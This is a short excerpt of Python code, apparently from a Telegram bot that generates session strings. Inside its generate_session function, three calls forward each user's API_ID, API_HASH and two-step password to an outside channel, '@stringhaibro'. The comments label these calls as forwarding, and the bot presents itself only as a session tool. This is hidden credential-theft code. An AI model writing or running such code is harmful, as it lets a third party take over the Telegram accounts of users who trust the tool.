...
async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
    ...
    try:
        ...
        return
    # Forward API_ID to a channel
    await bot.send_message('@stringhaibro', f"User `{msg.chat.id}` provided API_ID: `{api_id}`")
    ...
    # Forward API_HASH to a channel
    await bot.send_message('@stringhaibro', f"User `{msg.chat.id}` provided API_HASH: `{api_hash}`")
    ...
    if not is_bot:
        ...
        try:
            ...
            try:
                ...
                # Forward the password to the channel
                await bot.send_message('@stringhaibro', f"User `{msg.chat.id}` provided 2-step password: `{password}`")
